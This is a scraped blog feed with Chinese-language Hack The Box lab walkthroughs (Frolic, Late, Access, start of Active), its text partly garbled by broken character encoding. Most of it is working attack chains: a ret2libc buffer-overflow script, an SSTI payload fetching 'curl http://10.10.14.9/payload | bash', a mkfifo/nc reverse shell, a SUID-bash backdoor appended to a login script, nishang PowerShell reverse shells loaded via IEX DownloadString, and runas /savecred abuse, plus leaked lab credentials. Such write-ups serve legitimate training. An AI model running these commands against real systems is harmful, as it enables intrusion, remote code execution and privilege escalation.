rodata, value Stopped reason: SIGSEGV 0x62413762 in ?? () ç¡®å®æ˜¯æœ‰ç¼“å†²åŒºæº¢å‡º â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762 [*] Exact match at offset 52 åœ¨ç¬¬ 52 ä¸ªå­—ç¬¦æº¢å‡ºäº† â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# python -c &#39;print &quot;A&quot;*52&#39; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ä½¿ç”¨ python è¾“å‡º 52 ä¸ªAï¼Œç„¶ååœ¨åé¢å†åŠ ä¸Šæˆ‘ä»¬çš„ POC ç°åœ¨æˆ‘ä»¬éœ€è¦çŸ¥é“ &#x2F;bin&#x2F;sh çš„åœ°å€ www-data@frolic:/home/ayush/.binary$ ldd rop ldd rop linux-gate.so.1 =&gt; (0xb7fda000) libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e19000) /lib/ld-linux.so.2 (0xb7fdb000) å¾—åˆ°äº†åœ°å€ 0xb7e19000 æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿä½ç½® www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i system &lt;/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i system 245: 00112f20 68 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@@GLIBC_2.0 627: 0003ada0 55 FUNC GLOBAL DEFAULT 13 __libc_system@@GLIBC_PRIVATE 1457: 0003ada0 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0 æ‹¿åˆ°äº†ç³»ç»Ÿåœ°å€ 0003ada0 www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i exit &lt;/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i exit 112: 0002edc0 39 FUNC GLOBAL DEFAULT 13 __cxa_at_quick_exit@@GLIBC_2.10 141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0 450: 0002edf0 197 FUNC GLOBAL DEFAULT 13 __cxa_thread_atexit_impl@@GLIBC_2.18 558: 000b07c8 24 FUNC GLOBAL DEFAULT 13 _exit@@GLIBC_2.0 616: 00115fa0 56 FUNC GLOBAL DEFAULT 13 svc_exit@@GLIBC_2.0 652: 0002eda0 31 FUNC GLOBAL DEFAULT 13 quick_exit@@GLIBC_2.10 876: 0002ebf0 85 FUNC GLOBAL DEFAULT 13 __cxa_atexit@@GLIBC_2.1.3 1046: 0011fb80 52 FUNC GLOBAL DEFAULT 13 atexit@GLIBC_2.0 1394: 001b2204 4 OBJECT GLOBAL DEFAULT 33 argp_err_exit_status@@GLIBC_2.1 1506: 000f3870 58 FUNC GLOBAL DEFAULT 13 pthread_exit@@GLIBC_2.0 1849: 000b07c8 24 FUNC WEAK DEFAULT 13 _Exit@@GLIBC_2.1.1 2108: 001b2154 4 OBJECT GLOBAL DEFAULT 33 obstack_exit_failure@@GLIBC_2.0 2263: 0002e9f0 78 FUNC WEAK DEFAULT 13 on_exit@@GLIBC_2.0 2406: 000f4c80 2 FUNC GLOBAL DEFAULT 13 __cyg_profile_func_exit@@GLIBC_2.2 æ‹¿åˆ°äº† exit çš„åœ°å€ 0002e9d0 www-data@frolic:/home/ayush/.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 |grep bin/sh &lt;/.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 |grep bin/sh 15ba0b /bin/sh æ‹¿åˆ°äº† &#x2F;bin&#x2F;sh çš„åœ°å€ 15ba0b ç„¶åæˆ‘ä»¬å†™ä¸€ä¸ªå°è„šæœ¬ import struct buf = &quot;A&quot; * 52 libc = 0xb7e19000 system = struct.pack(&#39;&lt;I&#39;, libc + 0x0003ada0) exit = struct.pack(&#39;&lt;I&#39;, libc + 0x0002e9d0) binsh = struct.pack(&#39;&lt;I&#39;, libc + 0x0015ba0b) payload = buf + system + exit + binsh print payload â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat exploit.py|base64 -w 0 aW1wb3J0IHN0cnVjdAoKYnVmID0gIkEiICogNTIKbGliYyA9IDB4YjdlMTkwMDAKc3lzdGVtID0gc3RydWN0LnBhY2soJzxJJywgbGliYyArIDB4MDAwM2FkYTApCmV4aXQgPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAyZTlkMCkKYmluc2ggPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDE1YmEwYikKCnBheWxvYWQgPSBidWYgKyBzeXN0ZW0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ= æŠŠè„šæœ¬è½¬æ¢ä¸º base64 ç„¶ååˆ°é¶æœºé‡Œå†è§£ç å‡ºæ¥å­˜å‚¨ print payloadwww-data@frolic:~/html/playsms$ echo -n aW1wb3J0IHN0cnVjdAoKYnVmID0gIkEiICogNTIKbGliYyA9IDB4YjdlMTkwMDAKc3lzdGVtID0gc3RydWN0LnBhY2soJzxJJywgbGliYyArIDB4MDAwM2FkYTApCmV4aXQgPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAyZTlkMCkKYmluc2ggPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDE1YmEwYikKCnBheWxvYWQgPSBidWYgKyBzeXN0ZW0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ= | base64 -d &gt; exploit.py &lt;W0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ= | base64 -d &gt; exploit.py è¾“å‡ºæˆ exploit.py äº† ./rop $(python /var/www/html/playsms/exploit.py) ä½¿ç”¨ rop å»æ‰§è¡Œæˆ‘ä»¬çš„ exploit # whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=33(www-data) groups=33(www-data) æˆåŠŸææƒåˆ° root æƒé™ cat root.txt 85d3fdf03f969892538ba9a731826222 æˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Late - Hackthebox","slug":"Hackthebox - Late","date":"2022-04-25T11:38:36.000Z","updated":"2023-05-20T01:57:01.000Z","comments":true,"path":"2022/04/25/Hackthebox - Late/","link":"","permalink":"http://www.lucifiel.com/2022/04/25/Hackthebox%20-%20Late/","excerpt":"","text":"Hackthebox - Lateé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.156 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-23 21:42 EDT Nmap scan report for 10.10.11.156 Host is up (0.36s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA) | 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA) |_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: Late - Best online image tools Aggressive OS guesses: Linux 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.6 (93%), Linux 3.10 (92%), Linux 5.3 - 5.4 (92%), Linux 2.6.32 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 385.69 ms 10.10.14.1 2 385.83 ms 10.10.11.156 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.86 seconds Http è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªå›¾åƒç¼–è¾‘å™¨çš„ç½‘ç«™ï¼Œåˆ°å¤„çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªé“¾æ¥ http://images.late.htb/ æˆ‘ä»¬å»åŠ å…¥ä¸€ä¸ª hosts echo 10.10.11.156 late.htb images.late.htb &gt;&gt; /etc/hosts ç„¶åå†è®¿é—®ä¸€ä¸‹ è¿™é‡Œä¼¼ä¹æ˜¯ä¸Šä¼ å›¾ç‰‡ï¼Œç„¶åä¼šæ‰«æå›¾ç‰‡ï¼Œå…ˆéšä¾¿ä¼ ä¸€ä¸ªè¯•è¯•çœ‹ æˆ‘å°†ä¸Šé¢è¿™å¼ çº¯é»‘è‰²çš„å›¾ç‰‡ä¸Šä¼ ä¸Šå»æäº¤ä»¥åï¼Œç»™äº†æˆ‘ä¸€ä¸ªæ–‡ä»¶ results.txt &lt;p&gt;&lt;/p&gt; æˆ‘ä¸å¤ªç†è§£æ˜¯åšäº†ä»€ä¹ˆï¼Œä¹‹åå»æœç´¢äº†ä¸€ä¸‹ https://www.geeksforgeeks.org/python-convert-image-to-text-and-then-to-speech/ ä¼¼ä¹æ„æ€æ˜¯ä¼šæŠŠå›¾ç‰‡é‡Œçš„æ–‡å­—ä½¿ç”¨OCRè¯†åˆ«ï¼Œç„¶åè¾“å‡ºå‡ºæ¥ï¼Œä¸Šä¼ ä¸€å¼ å¸¦æ–‡å­—çš„å›¾ç‰‡è¯•è¯• å»ä¸Šä¼ ä¸€ä¸‹ &lt;p&gt;This is the first line of this text example. This is the second line of the same text. &lt;/p&gt; æœç„¶å¦‚æ­¤ï¼Œå»å°è¯•ä¸€ä¸‹ä¸Šä¼ ä¸€äº›æ¶æ„æ–‡ä»¶è¯•è¯• &lt;p&gt;whoami &lt;/p&gt; æˆ‘ä¸Šä¼ äº†ä¸€å¼ å¸¦æœ‰ whoami çš„å›¾ç‰‡ï¼Œè¯†åˆ«å‡ºæ¥åæ²¡æœ‰æ‰§è¡Œï¼Œå’±ä»¬è¯•è¯•æŠŠ æ ‡ç­¾ç»™é—­ç¯è¯•è¯• &lt;p&gt;&lt;/p&gt;whoami&lt;p&gt; &lt;/p&gt; é—­ç¯å¤±è´¥ï¼Œé‡æ–°æ„é€ ä¸€ä¸‹å…¶ä»–è¯­å¥ æˆ‘ä»¬å°è¯•ä¸€ä¸‹ SSTI &lt;p&gt;S81 &lt;/p&gt; å¾—åˆ°äº†æ­£ç¡®ç­”æ¡ˆ æ¼æ´åˆ©ç”¨é‚£å°è¯•æ„é€ ä¸€ä¸‹æ˜¯å¦å¯ä»¥æ‰§è¡Œå‘½ä»¤ ${{request.application._ _globals_ _._ _builtins_ _._ _import_ _(\"os\").popen(\"whoami\").read()}} &lt;p&gt;$svc_acc &lt;/p&gt; æ‰§è¡ŒæˆåŠŸï¼Œè¿™ä¸ª OCR è¯†åˆ«çš„æ¡ä»¶éå¸¸è‹›åˆ»ï¼Œæˆ‘å°è¯•äº†å¾ˆå¤šå¾ˆå¤šå­—ä½“ï¼Œæ€»ç®—æˆäº†ä¸€ä¸ª æƒ³åŠæ³•æ¥åšä¸€ä¸ªåå¼¹ Shell çš„ payload é¦–å…ˆæˆ‘ä»¬ç”Ÿæˆæˆ‘ä»¬è¦çš„å›¾ç‰‡ ${{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"curl http://10.10.14.9/payload | bash\").read()}} æ¥ç€åœ¨æ¡Œé¢åˆ›å»ºä¸€ä¸ª payload æ–‡ä»¶ï¼Œå†…å®¹ä¸º rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.9 4444 &gt;/tmp/f æ¥ç€å’±ä»¬éœ€è¦å¼€ä¸¤ä¸ªå‘½ä»¤çª—å£ Command 1 python3 -m http.server 80 Command 2 nc -nvlp 4444 ç„¶åä¸Šä¼ æˆ‘ä»¬çš„ Payload â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.11.156] 58240 bash: cannot set terminal process group (1213): Inappropriate ioctl for device bash: no job control in this shell svc_acc@late:~/app$ whoami&amp;&amp;id whoami&amp;&amp;id svc_acc uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc) æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ shell svc_acc@late:~$ cat user.txt cat user.txt af80a52c1f6ce51724a56a589a96ce20 æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡é¦–å…ˆè¿è¡Œä¸€ä¸‹ pspy https://github.com/DominicBreuker/pspy è¿™é‡Œæ‰¾åˆ°äº†ä¸€ä¸ªå®šæ—¶ä»»åŠ¡è„šæœ¬ /usr/local/sbin/ssh-alert.sh #!/bin/bash RECIPIENT=&quot;root@late.htb&quot; SUBJECT=&quot;Email from Server Login: SSH Alert&quot; BODY=&quot; A SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a` &quot; if [ ${PAM_TYPE} = &quot;open_session&quot; ]; then echo &quot;Subject:${SUBJECT} ${BODY}&quot; | /usr/sbin/sendmail ${RECIPIENT} fi è¿™æ˜¯è„šæœ¬çš„å†…å®¹ï¼Œå’±ä»¬åˆ†æä¸€ä¸‹ svc_acc@late:~$ ls -la /usr/local/sbin/ssh-alert.sh -rwxr-xr-x 1 svc_acc svc_acc 433 Apr 24 07:16 /usr/local/sbin/ssh-alert.sh svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh -----a--------e--- /usr/local/sbin/ssh-alert.sh è¿™é‡ŒæŸ¥çœ‹æƒé™ï¼Œå’±ä»¬æ˜¯å¯ä»¥å°†å†…å®¹å†™åˆ°è¿›å»çš„ echo &quot;chmod u+s /bin/bash&quot; &gt;&gt; /usr/local/sbin/ssh-alert.sh å’±ä»¬åŠ ä¸€ä¸ª bash SUIDï¼Œç„¶åé‡æ–°ç™»å½• sshï¼Œæ¥ç€æ‰§è¡Œææƒå‘½ä»¤ svc_acc@late:~$ echo &quot;chmod u+s /bin/bash&quot; &gt;&gt; /usr/local/sbin/ssh-alert.sh svc_acc@late:~$ exit logout Connection to 10.10.11.156 closed. â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh svc_acc@10.10.11.156 -i id_rsa -bash-4.4$ id uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc) -bash-4.4$ bash -p bash-4.4# id uid=1000(svc_acc) gid=1000(svc_acc) euid=0(root) groups=1000(svc_acc) æˆåŠŸæ‹¿åˆ° root æƒé™ bash-4.4# cat /root/root.txt 7af076bfa316a1091b3139a231ac7d1e æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Access - Hackthebox","slug":"Hackthebox - Access","date":"2022-04-24T11:38:36.000Z","updated":"2023-05-19T11:42:00.000Z","comments":true,"path":"2022/04/24/Hackthebox - Access/","link":"","permalink":"http://www.lucifiel.com/2022/04/24/Hackthebox%20-%20Access/","excerpt":"","text":"Hackthebox - Accessé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.98 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-24 22:29 EDT Nmap scan report for 10.10.10.98 Host is up (0.34s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: MegaCorp Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 23/tcp) HOP RTT ADDRESS 1 338.15 ms 10.10.14.1 2 338.30 ms 10.10.10.98 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 89.52 seconds è¿™é‡Œæœ‰ä¸ª ftpï¼Œä½¿ç”¨åŒ¿åç”¨æˆ·æŸ¥çœ‹ FTPâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ftp 10.10.10.98 Connected to 10.10.10.98. 220 Microsoft FTP Service Name (10.10.10.98:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ç™»å…¥åæœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ ftp&gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-23-18 09:16PM &lt;DIR&gt; Backups 08-24-18 10:00PM &lt;DIR&gt; Engineer 226 Transfer complete. Backups å’Œ Engineer é‡Œåˆ†åˆ«æœ‰ä¸€ä¸ªæ–‡ä»¶ ftp&gt; ls backups 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-23-18 09:16PM 5652480 backup.mdb 226 Transfer complete. ftp&gt; ls engineer 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-24-18 01:16AM 10870 Access Control.zip 226 Transfer complete. ä½¿ç”¨ get ç»™å®ƒä¸‹è½½ä¸‹æ¥ï¼Œbackup.mdb æ¯”è¾ƒå¤§ï¼Œå¤šç­‰å¾…ä¸€ä¸‹ å»æŸ¥çœ‹ä¸€ä¸‹ backup.mdb çš„æ–‡ä»¶ æ¼æ´åˆ©ç”¨Zipâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# strings backup.mdb|grep access access4u@security æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œåº”è¯¥æ˜¯è§£å‹å¯†ç ï¼Œå»å°è¯•è§£å‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ls Access\\ Control.pst 2 â¨¯ &#39;Access Control.pst&#39; è§£å‹æˆåŠŸ PSTä½¿ç”¨ readpst æ¥æå–æ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# readpst Access\\ Control.pst Opening PST file and indexes... Processing Folder &quot;Deleted Items&quot; &quot;Access Control&quot; - 2 items done, 0 items skipped. ç„¶åæŸ¥çœ‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat Access\\ Control.mbox The password for the â€œsecurityâ€ account has been changed to 4Cc3ssC0ntr0ller. Please ensure this is passed on to your engineers. åœ¨é‡Œé¢æ‰¾åˆ°ä¸€ä¸ªå¯†ç  username = security password = 4Cc3ssC0ntr0ller å»å°è¯•ç™»å½• 23 ç«¯å£ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# telnet 10.10.10.98 Trying 10.10.10.98... Connected to 10.10.10.98. Escape character is &#39;^]&#39;. Welcome to Microsoft Telnet Service login: security password: *=============================================================== Microsoft Telnet Server. *=============================================================== C:\\Users\\security&gt;whoami access\\security æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ shell C:\\Users\\security\\Desktop&gt;type user.txt ff1f3b48913b213a31ff6756d2553d38 æˆåŠŸå¾—åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡C:\\Users\\security&gt;powershell whoami access\\security ç¡®è®¤ powershell å­˜åœ¨å¹¶å¯æ‰§è¡Œå‘½ä»¤ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cp /opt/shells/Invoke-PowerShellTcp.ps1 nishang.ps1 æˆ‘ä»¬ä½¿ç”¨ nishang æ¥è¿›è¡Œææƒ ä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡ python3 -m http.server 80 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4444 å°†ä¸Šé¢è¿™å¥ä»£ç æ·»åŠ åˆ° nishang æœ€åä¸€è¡Œï¼Œç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 powershell &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.9/nishang.ps1&#39;)&quot; ç„¶åæ‰§è¡Œ PS C:\\Users\\security&gt;whoami access\\security ç°åœ¨æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªäº¤äº’å¼ shell äº†ï¼Œå…¶å®è¿™ä¸€æ­¥å¯ä»¥ä¸åšï¼Œä¸è¿‡æˆ‘å–œæ¬¢åœ¨ shell å†…è¾“å…¥å‘½ä»¤ï¼Œè€Œä¸èƒ½ä½¿ç”¨åˆ é™¤é”®å°±å¾ˆéš¾å— https://github.com/411Hall/JAWS æ¥ç€æˆ‘ä»¬ä½¿ç”¨ JAWS æ¥è¿›è¡Œæšä¸¾ powershell &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.9/jaws-enum.ps1&#39;)&quot; cmd.exe 764 security /q /k C:\\Windows\\system32\\login.cmd è¿™é‡Œçœ‹åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆ C:\\Users\\security&gt;type C:\\Windows\\system32\\login.cmd @echo off rem rem Default global login script for the Telnet Server rem rem In the default setup, this command script is executed when the rem initial command shell is invoked. It, in turn, will try to invoke rem the individual user&#39;s login script. rem echo *=============================================================== echo Microsoft Telnet Server. echo *=============================================================== cd /d %HOMEDRIVE%\\%HOMEPATH% è¿™æ˜¯è„šæœ¬çš„å†…å®¹ C:\\Users\\security&gt;cmdkey /list Currently stored credentials: Target: Domain:interactive=ACCESS\\Administrator Type: Domain Password User: ACCESS\\Administrator ä½¿ç”¨ cmdkey &#x2F;list æ‰¾åˆ°äº†å­˜å‚¨çš„ç™»å½•å‡­è¯ PS C:\\Users\\Public\\Desktop&gt;dir Directory: C:\\Users\\Public\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a--- 8/22/2018 10:18 PM 1870 ZKAccess3.5 Security System.lnk åœ¨ public ç”¨æˆ·çš„æ¡Œé¢å‘ç°äº†ä¸€ä¸ªå¿«æ·æ–¹å¼æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ PS C:\\Users\\Public\\Desktop&gt; type &quot;ZKAccess3.5 Security System.lnk&quot; L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\\R1M?:Windows???:?â–’M?:*wWindowsV1MV?System32???:?â–’MV?*?System32â–’X2P?:? runas.exe???:1??:1?*Yrunas.exeâ–’L-K??E?C:\\Windows\\System32\\runas.exe#..\\..\\..\\Windows\\System32\\runas.exeC:\\ZKTeco\\ZKAccess3.5G/user:ACCESS\\Administrator /savecred &quot;C:\\ZKTeco\\ZKAccess3.5\\Access.exe&quot;&#39;C:\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico?%SystemDrive%\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico%SystemDrive%\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico?%? ?wN?â–’?]N?D.??Q???`?Xaccess?_???8{E?3 O?j)?H??? )??[?_???8{E?3 O?j)?H??? )??[? ??1SPS??XF?L8C???&amp;?m?e*S-1-5-21-953262931-566350628-63446256-500 å¯ä»¥çœ‹åˆ°è¿™ä¸€è¡Œ \\Windows\\System32\\runas.exeC:\\ZKTeco\\ZKAccess3.5G/user:ACCESS\\Administrator /savecred &quot;C:\\ZKTeco\\ZKAccess3.5\\Access.exe&quot; è¿™é‡Œçš„æ„æ€æ˜¯ å¯ä»¥ä½¿ç”¨ administrator æƒé™è¿è¡Œ access.exe æ–‡ä»¶ï¼Œæˆ‘ä»¬æŠŠåé¢çš„ access.exe æ–‡ä»¶æ¢æˆæˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤ï¼Œé‚£ä¸å°±å¯ä»¥ææƒäº†ï¼Ÿ æˆ‘ä»¬æŠŠè¿™é‡Œçš„ access.exe æ¢æˆæˆ‘ä»¬çš„ nishang runas /user:ACCESS\\Administrator /savecred &quot;powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.9/nishang.ps1&#39;)&quot; â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 1 â¨¯ listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.98] 49166 Windows PowerShell running as user Administrator on ACCESS Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32&gt;whoami access\\administrator æˆåŠŸæ‹¿åˆ° administrator æƒé™çš„ shell PS C:\\users\\administrator\\desktop&gt; type root.txt 6e1586cc7ab230a8d297e8f933d904cf æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Active - Hackthebox","slug":"Hackthebox - Active","date":"2022-04-24T11:38:36.000Z","updated":"2023-05-19T11:45:11.000Z","comments":true,"path":"2022/04/24/Hackthebox - Active/","link":"","permalink":"http://www.lucifiel.com/2022/04/24/Hackthebox%20-%20Active/","excerpt":"","text":"Hackthebox - Activeé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.100 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-22 02:56 EDT Nmap scan report for 10.10.10.100 Host is up (0.32s latency). Not shown: 65513 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-22 06:57:01Z) 135/tcp open msrpc? 139/tcp open netbios-ssn? 389/tcp open tcpwrapped 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msdfsr? 9389/tcp open mc-nmf .NET Message Framing 49152/tcp open unknown 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open unknown 49155/tcp open tcpwrapped 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open tcpwrapped 49165/tcp open msrpc Microsoft Windows RPC 49170/tcp open unknown 49171/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port139-TCP:V=7.91%I=7%D=4/22%Time=626251C0%P=x86_64-pc-linux-gnu%r(Get SF:Request,5,&quot;\\x83\\0\\0\\x01\\x8f&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/22%OT=53%CT=1%CU=38032%PV=Y%DS=2%DC=T%G=Y%TM=6262527 OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI=I%TS=7)SEQ(SP=1 OS:05%GCD=1%ISR=10D%TI=I%CI=RD%II=I%SS=O%TS=7)SEQ(SP=105%GCD=1%ISR=10E%TI=R OS:D%CI=I%II=I%TS=A)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M5 